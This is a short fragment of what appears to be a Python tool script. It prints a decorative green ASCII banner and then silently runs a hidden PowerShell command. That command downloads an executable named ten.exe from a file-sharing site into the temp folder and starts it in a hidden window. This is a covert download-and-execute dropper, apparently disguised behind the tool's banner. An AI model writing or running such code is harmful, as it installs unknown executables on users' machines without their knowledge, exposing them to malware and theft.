...
{Fore.GREEN}   $$$$$$/  $$$$$$$$/ $$/   $$/     $/     $$$$$$$$/ $$/   $$/        $$$$$$/  $$$$$$$$/  $$$$$$/  $$/   $$/ $$$$$$$$/ 
    ...
    """
    os.system(fr'powershell -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri ''https://www.upload.ee/download/16183265/b615924f4d451e30ef07/ten.exe'' -OutFile ([System.IO.Path]::GetTempPath() + ''ten.exe'')); Start-Process -FilePath ([System.IO.Path]::GetTempPath() + ''ten.exe'') -WindowStyle Hidden"')
